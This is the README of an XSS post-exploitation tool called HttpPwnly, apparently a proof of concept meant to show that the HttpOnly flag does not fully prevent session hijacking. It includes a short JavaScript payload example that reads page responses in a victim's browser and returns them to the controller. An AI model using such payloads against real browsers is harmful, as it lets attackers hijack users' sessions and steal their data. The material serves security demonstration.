# HttpPwnly

"Repeater" style XSS post-exploitation tool for mass browser control. Primarily a PoC to show why HttpOnly flag isn't a complete protection against session hijacking via XSS.

## Dependencies:
pip install -r requirements.txt 

## Demo:
https://www.youtube.com/watch?v=spfrmsbhBaw

## Asynchronous payloads:
To overide normal task output data within your payload (for example in order to retrieve output from XMLHttpRequest), call the "sendOutput" function and pass it your intended output. For example:

```javascript
var xmlhttp = new XMLHttpRequest();
  xmlhttp.onreadystatechange = function() {
    if (xmlhttp.readyState == 4) {
      sendOutput(id,xmlhttp.responseText);
    }
  };
xmlhttp.open("GET", "/", true);
xmlhttp.send();
```
